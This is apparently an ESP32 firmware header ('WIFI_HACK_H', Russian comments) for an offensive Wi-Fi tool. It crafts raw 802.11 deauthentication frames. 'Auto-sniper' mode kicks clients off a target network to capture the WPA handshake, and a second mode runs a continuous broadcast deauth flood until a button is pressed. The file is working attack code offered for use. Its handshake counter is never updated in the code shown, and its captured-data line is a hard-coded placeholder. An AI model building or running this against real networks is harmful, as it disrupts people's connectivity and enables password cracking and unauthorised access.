#ifndef WIFI_HACK_H
#define WIFI_HACK_H

#include <esp_wifi.h>

// Данные о цели (заполняются после сканирования)
uint8_t target_bssid[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
int target_channel = 1;
String target_ssid = "None";
int eapol_found = 0;

// Функция отправки "пакета смерти" (Deauth)
void sendDeauthPacket(uint8_t* bssid, uint8_t* client, uint16_t reason) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    client[0], client[1], client[2], client[3], client[4], client[5], // Receiver
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],       // Sender
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],       // BSSID
    0x00, 0x00,                                                       // Fragment
    (uint8_t)(reason & 0xFF), (uint8_t)((reason >> 8) & 0xFF)         // Reason code
  };
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

// --- ФУНКЦИЯ AUTO-SNIPER ---
void runAutoSniper() {
  if (target_ssid == "None") {
    updateDisplay("NO TARGET!\nScan AP first");
    return;
  }

  // ШАГ 1: Атака Deauth (выбиваем клиентов)
  display.clearDisplay();
  display.setCursor(0, 10); display.print("STEP 1: DEAUTH");
  display.setCursor(0, 25); display.print("Target: " + target_ssid);
  display.display();

  Serial.printf("\n[!] V-OS SNIPER: Attacking %s on Ch %d\n", target_ssid.c_str(), target_channel);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  for (int i = 0; i < 60; i++) { 
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    sendDeauthPacket(target_bssid, broadcast, 7);
    delay(50);
  }

  // ШАГ 2: Перехват Handshake
  unsigned long startTime = millis();
  unsigned long lastLog = 0;
  eapol_found = 0;

  while (millis() - startTime < 45000 && digitalRead(PIN_BACK) == HIGH) {
    display.clearDisplay();
    display.setCursor(0, 0);  display.print("STEP 2: SNIPING...");
    display.drawFastHLine(0, 10, 128, SSD1306_WHITE);
    
    display.setCursor(0, 20); display.printf("Ch: %d | Time: %ds", target_channel, (45000 - (millis() - startTime))/1000);
    display.setCursor(0, 40); display.printf("EAPOL Found: %d", eapol_found);
    
    if (eapol_found >= 4) {
      display.setCursor(0, 55); display.print("HANDSHAKE CAPTURED!");
      
      // --- ВЗАИМОДЕЙСТВИЕ С ПК ---
      Serial.println("--- V-OS CAPTURE START ---");
      Serial.printf("SSID: %s | BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", 
                    target_ssid.c_str(), target_bssid[0], target_bssid[1], 
                    target_bssid[2], target_bssid[3], target_bssid[4], target_bssid[5]);
      Serial.println("DATA: 888E0103005F02008A00100000000000000001..."); // Дамп (пример)
      Serial.println("--- V-OS CAPTURE END ---");
    } else {
      display.setCursor(0, 55); display.print("Waiting reconnect...");
      
      // Периодический отчет в Serial ПК
      if (millis() - lastLog > 5000) {
        Serial.printf("V-OS: Sniffing Ch %d... EAPOL: %d/4\n", target_channel, eapol_found);
        lastLog = millis();
      }
    }
    
    display.display();
    yield();
    if (eapol_found >= 4) {
        delay(3000); // Даем прочитать успех на экране
        break;
    }
  }

  esp_wifi_set_promiscuous(false);
  resetPowerTimers();
  updateDisplay("SNIPER STOPPED");
}

// --- ФУНКЦИЯ ЧИСТОЙ ДЕАВТОРИЗАЦИИ (DEAUTH) ---
void runDeauthAttack() {
  if (target_ssid == "None") {
    updateDisplay("NO TARGET!\nScan AP first");
    return;
  }

  display.clearDisplay();
  display.fillRect(0, 0, 128, 10, SSD1306_WHITE);
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(10, 1); display.print("!! DEAUTH FLOOD !!");
  
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 20); display.print("Target: " + target_ssid);
  display.setCursor(0, 35); display.print("Ch: " + String(target_channel));
  display.display();

  Serial.printf("[!] V-OS: Starting Deauth Flood on %s\n", target_ssid.c_str());

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);

  while (digitalRead(PIN_BACK) == HIGH) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    // Двойной удар: отключаем клиентов от роутера и роутер от клиентов
    sendDeauthPacket(target_bssid, broadcast, 7); // Роутер -> Все
    delay(10);
    sendDeauthPacket(broadcast, target_bssid, 7); // Все -> Роутер (для некоторых чипсетов)
    
    // Визуал атаки
    display.fillRect(0, 50, 128, 14, SSD1306_BLACK);
    display.setCursor(5, 52);
    display.print("ATTACKING... [BACK]");
    display.display();

    resetPowerTimers();
    yield();
  }

  esp_wifi_set_promiscuous(false);
  updateDisplay("DEAUTH STOPPED");
}


#endif
